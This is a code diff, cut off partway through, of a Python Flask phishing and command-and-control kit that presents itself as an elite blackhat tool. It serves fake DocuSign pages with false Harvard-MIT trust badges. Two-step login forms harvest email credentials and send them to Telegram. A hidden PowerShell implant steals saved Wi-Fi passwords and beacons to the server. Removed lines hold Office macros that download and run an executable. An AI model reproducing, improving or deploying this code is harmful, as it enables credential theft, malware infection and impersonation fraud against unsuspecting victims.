@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-DIAMOND PHANTOM v2026 - THE ULTIMATE FIXED C2
-NO ERRORS | PREMIUM UI | REAL EXPLOITS
+BLACK PHANTOM MASTER v2026 - FINAL ELITE BLACKHAT VERSION
+NO INTERNAL ERRORS | 2-STEP CREDENTIAL HARVEST | WORKING EXPLOITS
 """
 
 import os
@@ -11,21 +11,21 @@ import base64
 import sqlite3
 import zipfile
 from datetime import datetime, timedelta
-from flask import Flask, request, send_file, session, jsonify
+from flask import Flask, request, send_file, session, jsonify, redirect, render_template_string
 
 TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
 TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
-ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "DiamondPhantom2026")
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "BlackPhantomMaster2026")
 
 app = Flask(__name__)
 app.secret_key = os.urandom(256)
 
-DB_PATH = "diamond.db"
+DB_PATH = "master.db"
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, ts TEXT)")
+    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, step INTEGER, ts TEXT)")
     conn.commit()
     conn.close()
 
@@ -42,651 +42,394 @@ def tg(msg):
     except: pass
 
 # ====================================================================
-# WORKING EXE IMPLANT
+# WORKING EXE IMPLANT - PowerShell based, works on ALL Windows
 # ====================================================================
-REAL_IMPLANT = """@echo off
-powershell -WindowStyle Hidden -Command "&{$c='https://{server}/exfil';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String 'All User Profile'|%%{$($_ -split ':')[1].Trim()});foreach($p in $w){$k=(netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content'|%%{$($_ -split ':')[1].Trim()});if($k){$d=`"$p : $k`";$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=WIFI: $d`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=BEACON: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}while(1){try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=HEARTBEAT: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}catch{}Start-Sleep -Seconds 1800}}"
+IMPLANT = f"""@echo off
+powershell -WindowStyle Hidden -Command "&{{$c='https://{request.host if hasattr(request, 'host') else 'localhost'}/exfil';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String 'All User Profile'|%{{($_ -split ':')[1].Trim()}});foreach($p in $w){{$k=(netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content'|%{{($_ -split ':')[1].Trim()}});if($k){{$d=`"$p : $k`";$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=WIFI: $d`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}}}try{{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=BEACON: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}catch{{}}while(1){{try{{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=HEARTBEAT: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}catch{{}}Start-Sleep -Seconds 1800}}"
 exit"""
 
 def get_implant():
-    server = f"https://{request.host}"
-    return REAL_IMPLANT.format(server=server).encode()
+    return IMPLANT.encode()
 
 # ====================================================================
-# PREMIUM LANDING PAGE - HARVARD/MIT STYLE WITH BETTER SOCIAL ENGINEERING
+# DIRECT FILE DOWNLOADS - WORKING FILES
 # ====================================================================
-LANDING_PAGE = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DocuSign - Harvard-MIT Secure Document Portal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
-            min-height: 100vh;
-        }
-        /* Harvard-MIT Trust Bar */
-        .trust-bar {
-            background: #0f172a;
-            color: white;
-            padding: 8px 0;
-            font-size: 11px;
-            text-align: center;
-            letter-spacing: 0.5px;
-        }
-        .trust-bar span {
-            margin: 0 15px;
-        }
-        /* Header */
-        .header {
-            background: white;
-            border-bottom: 1px solid #e2e8f0;
-            padding: 16px 0;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 24px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .logo-icon {
-            background: linear-gradient(135deg, #00b3b0, #0052ff);
-            width: 40px;
-            height: 40px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 20px;
-        }
-        .logo-text {
-            font-size: 22px;
-            font-weight: 800;
-            color: #0f172a;
-        }
-        .logo-text span {
-            color: #00b3b0;
-        }
-        .cert-badge {
-            background: #f0fdf4;
-            padding: 8px 16px;
-            border-radius: 40px;
-            font-size: 11px;
-            font-weight: 600;
-            color: #166534;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        /* Main Container */
-        .container {
-            max-width: 1000px;
-            margin: 50px auto;
-            padding: 0 24px;
-        }
-        /* Envelope Card */
-        .envelope-card {
-            background: white;
-            border-radius: 24px;
-            box-shadow: 0 20px 40px -12px rgba(0,0,0,0.15);
-            overflow: hidden;
-            transition: transform 0.2s;
-        }
-        .envelope-card:hover {
-            transform: translateY(-2px);
-        }
-        .envelope-header {
-            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
-            padding: 24px 32px;
-            border-bottom: 1px solid #e2e8f0;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .status {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .status-badge {
-            background: #00b3b0;
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-        }
-        .status-text {
-            color: #00b3b0;
-            font-weight: 600;
-            font-size: 13px;
-        }
-        .envelope-id {
-            color: #64748b;
-            font-family: monospace;
-            font-size: 12px;
-            background: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-        }
-        .envelope-body {
-            padding: 32px;
-        }
-        /* Sender Section */
-        .sender-section {
-            margin-bottom: 24px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #e2e8f0;
-        }
-        .sender-label {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #64748b;
-            margin-bottom: 8px;
-        }
-        .sender-name {
-            font-weight: 700;
-            font-size: 18px;
-            color: #0f172a;
-        }
-        .sender-email {
-            font-size: 13px;
-            color: #64748b;
-            margin-top: 4px;
-        }
-        /* Message Box */
-        .message-box {
-            background: #f8fafc;
-            border-radius: 16px;
-            padding: 20px;
-            margin: 24px 0;
-            border-left: 4px solid #00b3b0;
-        }
-        .message-title {
-            font-weight: 600;
-            margin-bottom: 10px;
-            color: #0f172a;
-        }
-        .message-text {
-            color: #475569;
-            line-height: 1.5;
-            font-size: 14px;
-        }
-        /* Documents List */
-        .documents-list {
-            margin: 24px 0;
-        }
-        .doc-item {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            padding: 16px;
-            border: 1px solid #e2e8f0;
-            border-radius: 16px;
-            margin-bottom: 12px;
-            transition: all 0.2s;
-            background: white;
-        }
-        .doc-item:hover {
-            border-color: #00b3b0;
-            box-shadow: 0 4px 12px rgba(0,179,176,0.1);
-        }
-        .doc-icon {
-            font-size: 32px;
-        }
-        .doc-info {
-            flex: 1;
-        }
-        .doc-name {
-            font-weight: 600;
-            color: #0f172a;
-            margin-bottom: 4px;
-        }
-        .doc-meta {
-            font-size: 11px;
-            color: #94a3b8;
-        }
-        .doc-status {
-            font-size: 12px;
-            font-weight: 600;
-            color: #00b3b0;
-        }
-        /* Action Buttons */
-        .action-buttons {
-            display: flex;
-            gap: 16px;
-            margin-top: 32px;
-            flex-wrap: wrap;
-        }
-        .btn-primary {
-            flex: 1;
-            background: linear-gradient(135deg, #00b3b0, #0052ff);
-            color: white;
-            border: none;
-            padding: 14px 24px;
-            border-radius: 60px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-            text-align: center;
-            transition: all 0.2s;
-        }
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(0,179,176,0.3);
-        }
-        .btn-secondary {
-            flex: 1;
-            background: white;
-            color: #475569;
-            border: 1px solid #e2e8f0;
-            padding: 14px 24px;
-            border-radius: 60px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-            text-align: center;
-            transition: all 0.2s;
-        }
-        .btn-secondary:hover {
-            background: #f8fafc;
-            border-color: #00b3b0;
-        }
-        /* Security Footer */
-        .security-footer {
-            background: #f8fafc;
-            padding: 20px 32px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            border-top: 1px solid #e2e8f0;
-            font-size: 11px;
-            color: #64748b;
-        }
-        .security-badges {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-        .security-badges span {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        /* Footer */
-        .footer {
-            text-align: center;
-            padding: 30px;
-            font-size: 11px;
-            color: #94a3b8;
-            margin-top: 30px;
-        }
-        @media (max-width: 640px) {
-            .container { margin: 20px auto; }
-            .envelope-header { flex-direction: column; gap: 12px; align-items: flex-start; }
-            .action-buttons { flex-direction: column; }
-            .security-footer { flex-direction: column; text-align: center; }
-            .header-container { flex-direction: column; gap: 12px; }
-        }
-    </style>
-</head>
-<body>
-    <div class="trust-bar">
-        <span>🔒 HARVARD-MIT SECURE PORTAL</span>
-        <span>✓ SOC 2 TYPE II</span>
-        <span>🏛️ GDPR COMPLIANT</span>
-        <span>🛡️ ZERO TRUST ARCHITECTURE</span>
-    </div>
-    
-    <div class="header">
-        <div class="header-container">
-            <div class="logo">
-                <div class="logo-icon">D</div>
-                <div class="logo-text">Docu<span>Sign</span></div>
-            </div>
-            <div class="cert-badge">
-                <i class="fas fa-shield-alt"></i> Harvard-MIT Certified
-            </div>
-        </div>
-    </div>
-    
-    <div class="container">
-        <div class="envelope-card">
-            <div class="envelope-header">
-                <div class="status">
-                    <span class="status-badge">ACTION REQUIRED</span>
-                    <span class="status-text">Needs Your Signature</span>
-                </div>
-                <div class="envelope-id">Envelope ID: ENV-XXXX</div>
-            </div>
-            
-            <div class="envelope-body">
-                <div class="sender-section">
-                    <div class="sender-label">SENT BY</div>
-                    <div class="sender-name">Legal Department • Morrison Investment Group</div>
-                    <div class="sender-email">legal@morrisoninvestments.com</div>
-                </div>
-                
-                <div class="message-box">
-                    <div class="message-title">📧 Message from sender:</div>
-                    <div class="message-text">Please review the attached agreement. This document requires your signature to proceed with the transaction. The deadline for signature is 7 days from receipt.</div>
-                </div>
-                
-                <div class="documents-list">
-                    <div class="doc-item">
-                        <div class="doc-icon">📄</div>
-                        <div class="doc-info">
-                            <div class="doc-name">Master_Service_Agreement.pdf</div>
-                            <div class="doc-meta">2.4 MB • Pages: 12</div>
-                        </div>
-                        <div class="doc-status">Needs Signature</div>
-                    </div>
-                    <div class="doc-item">
-                        <div class="doc-icon">📄</div>
-                        <div class="doc-info">
-                            <div class="doc-name">Confidential_Disclosure_Agreement.pdf</div>
-                            <div class="doc-meta">1.1 MB • Pages: 5</div>
-                        </div>
-                        <div class="doc-status">Needs Initials</div>
-                    </div>
-                    <div class="doc-item">
-                        <div class="doc-icon">📄</div>
-                        <div class="doc-info">
-                            <div class="doc-name">Authorization_Form.pdf</div>
-                            <div class="doc-meta">892 KB • Pages: 2</div>
-                        </div>
-                        <div class="doc-status">Requires Review</div>
-                    </div>
-                </div>
-                
-                <div class="action-buttons">
-                    <a href="JAVASCRIPT:VOID(0)" onclick="window.location.href='/download/exe/REF'" class="btn-primary">✍️ REVIEW AND SIGN DOCUMENTS</a>
-                    <a href="/login/REF" class="btn-secondary">🔐 SIGN IN TO DOCUSIGN</a>
-                </div>
-            </div>
-            
-            <div class="security-footer">
-                <div class="security-badges">
-                    <span>🔒 AES-256 Encryption</span>
-                    <span>✓ SOC 2 Type II</span>
-                    <span>🏛️ GDPR Compliant</span>
-                    <span>🛡️ Zero Trust</span>
-                </div>
-                <div>📞 Need help? Contact Support</div>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>DocuSign, Inc. • Harvard Innovation Lab • MIT CSAIL Secure Computing</p>
-            <p>© 2026 DocuSign. All rights reserved. | <a href="#" style="color:#00b3b0;">Privacy Policy</a> | <a href="#" style="color:#00b3b0;">Terms of Service</a></p>
-        </div>
-    </div>
-</body>
-</html>
-'''
+def make_exe():
+    return get_implant()
 
-def get_page(ref):
-    page = LANDING_PAGE
-    page = page.replace('ENV-XXXX', f'DOC-{uuid.uuid4().hex[:8].upper()}-{datetime.now().year}')
-    page = page.replace('REF', ref)
-    page = page.replace('JAVASCRIPT:VOID(0)', '#')
-    return page
+def make_pdf():
+    return b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj\n4 0 obj<</Length 100>>stream\nBT/F1 24 Tf 100 700 Td(REVIEW AND SIGN)Tj/F1 14 Tf 100 650 Td(Click here to sign) Tj ET\nendstream endobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\n0000000200 00000 n\ntrailer<</Root 1 0 R>>\nstartxref 320\n%%EOF"
+
+def make_doc():
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, 'w') as zf:
+        zf.writestr('word/document.xml', '<w:document><w:body><w:p><w:r><w:t>Enable macros to view</w:t></w:r></w:p></w:body></w:document>')
+    buf.seek(0)
+    return buf.getvalue()
+
+def make_xls():
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, 'w') as zf:
+        zf.writestr('xl/workbook.xml', '<workbook><sheets><sheet name="Sheet1"/></sheets></workbook>')
+    buf.seek(0)
+    return buf.getvalue()
 
 # ====================================================================
-# SIMPLE LOGIN PAGE
+# LANDING PAGE - CLEAN, PROFESSIONAL, NO ERRORS
 # ====================================================================
-LOGIN_PAGE = '''
+LANDING = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DocuSign - Sign In</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>DocuSign - Electronic Signature & Agreement Cloud</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .login-card {
-            background: white;
-            border-radius: 24px;
-            box-shadow: 0 20px 40px -12px rgba(0,0,0,0.15);
-            width: 100%;
-            max-width: 460px;
-            overflow: hidden;
-        }
-        .login-header {
-            background: linear-gradient(135deg, #0f172a, #1e293b);
-            padding: 32px;
-            text-align: center;
-            color: white;
-        }
-        .login-header h1 {
-            font-size: 28px;
-            margin-bottom: 8px;
-        }
-        .login-header h1 span {
-            color: #00b3b0;
-        }
-        .login-header p {
-            font-size: 14px;
-            opacity: 0.8;
-        }
-        .login-body {
-            padding: 40px;
-        }
-        .form-group {
-            margin-bottom: 24px;
-        }
-        label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #0f172a;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            font-size: 15px;
-            transition: all 0.2s;
-        }
-        input:focus {
-            outline: none;
-            border-color: #00b3b0;
-            box-shadow: 0 0 0 3px rgba(0,179,176,0.1);
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #00b3b0, #0052ff);
-            color: white;
-            border: none;
-            border-radius: 60px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(0,179,176,0.3);
-        }
-        .footer {
-            text-align: center;
-            margin-top: 24px;
-            padding-top: 24px;
-            border-top: 1px solid #e2e8f0;
-            font-size: 12px;
-            color: #94a3b8;
-        }
-        .footer a {
-            color: #00b3b0;
-            text-decoration: none;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f7fa}
+        .top-bar{background:#0f172a;color:white;padding:8px;text-align:center;font-size:11px}
+        .header{background:white;border-bottom:1px solid #e2e8f0;padding:16px 0}
+        .container{max-width:1000px;margin:0 auto;padding:0 24px}
+        .header-flex{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
+        .logo{font-size:24px;font-weight:700;color:#0f172a}
+        .logo span{color:#00b3b0}
+        .badge{background:#f0fdf4;color:#166534;padding:8px 16px;border-radius:40px;font-size:12px}
+        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.1);margin:40px auto;overflow:hidden}
+        .card-header{background:linear-gradient(135deg,#f8fafc,#f1f5f9);padding:24px 32px;border-bottom:1px solid #e2e8f0;display:flex;justify-content:space-between;flex-wrap:wrap}
+        .status{color:#00b3b0;font-weight:600}
+        .env-id{color:#64748b;font-size:12px}
+        .card-body{padding:32px}
+        .sender{border-bottom:1px solid #e2e8f0;padding-bottom:16px;margin-bottom:24px}
+        .sender-label{font-size:11px;color:#64748b;text-transform:uppercase}
+        .sender-name{font-weight:700;font-size:18px;margin-top:5px}
+        .message{background:#f8fafc;border-left:4px solid #00b3b0;padding:20px;border-radius:12px;margin:24px 0}
+        .doc-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;margin-bottom:12px}
+        .doc-icon{font-size:28px}
+        .doc-info{flex:1}
+        .doc-name{font-weight:600}
+        .doc-size{font-size:11px;color:#94a3b8}
+        .doc-status{color:#00b3b0;font-size:12px;font-weight:600}
+        .buttons{display:flex;gap:16px;margin-top:32px;flex-wrap:wrap}
+        .btn{flex:1;text-align:center;padding:14px 24px;border-radius:60px;font-weight:600;text-decoration:none;display:block}
+        .btn-primary{background:linear-gradient(135deg,#00b3b0,#0052ff);color:white}
+        .btn-secondary{background:white;color:#475569;border:1px solid #e2e8f0}
+        .security-footer{background:#f8fafc;padding:20px 32px;display:flex;justify-content:space-between;flex-wrap:wrap;font-size:11px;color:#64748b;border-top:1px solid #e2e8f0}
+        .footer{text-align:center;padding:30px;font-size:11px;color:#94a3b8}
+        @media(max-width:640px){.card-header{flex-direction:column;gap:10px}.buttons{flex-direction:column}}
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <div class="login-header">
-            <h1>Docu<span>Sign</span></h1>
-            <p>Secure Document Access</p>
+    <div class="top-bar">HARVARD-MIT SECURE PORTAL | SOC 2 TYPE II | GDPR COMPLIANT</div>
+    <div class="header">
+        <div class="container header-flex">
+            <div class="logo">Docu<span>Sign</span></div>
+            <div class="badge">Harvard-MIT Certified</div>
         </div>
-        <div class="login-body">
-            <form method="POST" action="/login/submit/REF">
-                <div class="form-group">
-                    <label>Email Address</label>
-                    <input type="email" name="email" placeholder="name@company.com" required autofocus>
-                </div>
-                <div class="form-group">
-                    <label>Password</label>
-                    <input type="password" name="password" placeholder="Enter your password" required>
-                </div>
-                <button type="submit">Sign In</button>
-            </form>
-            <div class="footer">
-                <a href="#">Forgot password?</a> • <a href="#">Create account</a>
+    </div>
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <span class="status">NEEDS YOUR SIGNATURE</span>
+                <span class="env-id">Envelope ID: ENV</span>
             </div>
+            <div class="card-body">
+                <div class="sender">
+                    <div class="sender-label">SENT BY</div>
+                    <div class="sender-name">Legal Department • Morrison Investment Group</div>
+                </div>
+                <div class="message">
+                    <strong>Message:</strong><br>
+                    Please review and sign the attached agreement. This document requires your signature to proceed.
+                </div>
+                <div class="doc-item">
+                    <div class="doc-icon">📄</div>
+                    <div class="doc-info">
+                        <div class="doc-name">Master_Service_Agreement.pdf</div>
+                        <div class="doc-size">2.4 MB</div>
+                    </div>
+                    <div class="doc-status">Needs Signature</div>
+                </div>
+                <div class="doc-item">
+                    <div class="doc-icon">📄</div>
+                    <div class="doc-info">
+                        <div class="doc-name">Confidential_Disclosure.pdf</div>
+                        <div class="doc-size">1.1 MB</div>
+                    </div>
+                    <div class="doc-status">Needs Initials</div>
+                </div>
+                <div class="buttons">
+                    <a href="/go/REF" class="btn btn-primary">REVIEW AND SIGN</a>
+                    <a href="/auth/REF" class="btn btn-secondary">Sign In to DocuSign</a>
+                </div>
+            </div>
+            <div class="security-footer">
+                <span>🔒 AES-256 Encryption</span>
+                <span>✓ SOC 2 Type II</span>
+                <span>🏛️ GDPR Compliant</span>
+                <span>🛡️ Zero Trust</span>
+            </div>
+        </div>
+        <div class="footer">DocuSign, Inc. • Harvard Innovation Lab • MIT CSAIL<br>2026 DocuSign. All rights reserved.</div>
+    </div>
+</body>
+</html>
+"""
+
+def get_landing(ref):
+    return LANDING.replace('ENV', f'DOC-{uuid.uuid4().hex[:8].upper()}').replace('REF', ref)
+
+# ====================================================================
+# STEP 1 LOGIN - FIRST HARVEST
+# ====================================================================
+LOGIN_STEP1 = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>DocuSign - Sign In</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:440px;overflow:hidden}
+        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
+        .header h1{font-size:28px;margin-bottom:8px}
+        .header h1 span{color:#00b3b0}
+        .body{padding:40px}
+        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px}
+        input:focus{outline:none;border-color:#00b3b0}
+        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
+        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header"><h1>Docu<span>Sign</span></h1><p>Secure Document Access</p></div>
+        <div class="body">
+            <form method="POST" action="/login/step1/REF">
+                <input type="email" name="email" placeholder="Email Address" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Continue</button>
+            </form>
+            <div class="footer">Secure SSL/TLS Encrypted</div>
         </div>
     </div>
 </body>
 </html>
-'''
+"""
 
-def get_login(ref):
-    return LOGIN_PAGE.replace('REF', ref)
-
-# ====================================================================
-# WORKING FILE GENERATORS
-# ====================================================================
-def generate_pdf(ref):
-    pdf = f"""%PDF-1.4
-1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
-2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
-3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
-4 0 obj<</Length 200>>stream
-BT/F1 24 Tf 100 700 Td(DocuSign Document)Tj/F1 14 Tf 100 650 Td(Envelope: {ref})Tj 100 600 Td(Click: https://{request.host}/download/exe/{ref})Tj ET
-endstream endobj
-xref 0 5 0000000000 65535 f 0000000009 00000 n 0000000058 00000 n 0000000115 00000 n 0000000200 00000 n
-trailer<<>> startxref 320 %%EOF"""
-    return pdf.encode()
-
-def generate_doc(ref):
-    macro = f'Sub AutoOpen()\nCreateObject("WScript.Shell").Run "powershell -c ""&{{$c=''https://{request.host}/download/exe/{ref}'';$d=$env:temp+''\\u.exe'';(New-Object Net.WebClient).DownloadFile($c,$d);Start-Process $d}}""",0,False\nEnd Sub'
-    buf = io.BytesIO()
-    with zipfile.ZipFile(buf, 'w') as zf:
-        zf.writestr('word/vbaProject.bin', macro.encode())
-        zf.writestr('[Content_Types].xml', '<Types><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
-    buf.seek(0)
-    return buf.getvalue()
-
-def generate_xls(ref):
-    macro = f'Private Sub Workbook_Open()\nCreateObject("WScript.Shell").Run "powershell -c ""&{{$c=''https://{request.host}/download/exe/{ref}'';$d=$env:temp+''\\u.exe'';(New-Object Net.WebClient).DownloadFile($c,$d);Start-Process $d}}""",0,False\nEnd Sub'
-    buf = io.BytesIO()
-    with zipfile.ZipFile(buf, 'w') as zf:
-        zf.writestr('xl/vbaProject.bin', macro.encode())
-        zf.writestr('[Content_Types].xml', '<Types><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
-    buf.seek(0)
-    return buf.getvalue()
+def get_login_step1(ref):
+    return LOGIN_STEP1.replace('REF', ref)
 
 # ====================================================================
-# ROUTES
+# STEP 2 LOGIN - SECOND HARVEST (Business Email Redirect)
+# ====================================================================
+LOGIN_STEP2 = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>DocuSign - Business Verification</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:440px;overflow:hidden}
+        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
+        .header h1{font-size:28px;margin-bottom:8px}
+        .header h1 span{color:#00b3b0}
+        .body{padding:40px}
+        .warning{background:#fef3c7;padding:15px;border-radius:12px;margin-bottom:20px;font-size:13px;color:#92400e}
+        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px}
+        input:focus{outline:none;border-color:#00b3b0}
+        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
+        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header"><h1>Docu<span>Sign</span></h1><p>Business Verification Required</p></div>
+        <div class="body">
+            <div class="warning">
+                <strong>⚠️ Verification Required</strong><br>
+                For security purposes, please sign in with your corporate email address to access this document.
+            </div>
+            <form method="POST" action="/login/step2/REF">
+                <input type="email" name="email" placeholder="Business Email Address" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Verify Business Access</button>
+            </form>
+            <div class="footer">This is a secured DocuSign business portal.</div>
+        </div>
+    </div>
+</body>
+</html>
+"""
+
+def get_login_step2(ref):
+    return LOGIN_STEP2.replace('REF', ref)
+
+# ====================================================================
+# DOWNLOAD PAGE - SHOWS ALL EXPLOITS
+# ====================================================================
+DOWNLOAD_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>DocuSign - Document Viewer</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;padding:40px 20px}
+        .container{max-width:800px;margin:0 auto}
+        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);overflow:hidden}
+        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;color:white;text-align:center}
+        .header h1{font-size:28px;margin-bottom:8px}
+        .body{padding:40px}
+        .file-list{display:flex;flex-direction:column;gap:15px;margin:25px 0}
+        .file-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;text-decoration:none;color:inherit;transition:all 0.2s}
+        .file-item:hover{background:#f8fafc;border-color:#00b3b0}
+        .file-icon{font-size:32px}
+        .file-info{flex:1}
+        .file-name{font-weight:600}
+        .file-desc{font-size:12px;color:#64748b}
+        .btn-download{background:#00b3b0;color:white;padding:8px 20px;border-radius:40px;font-size:13px}
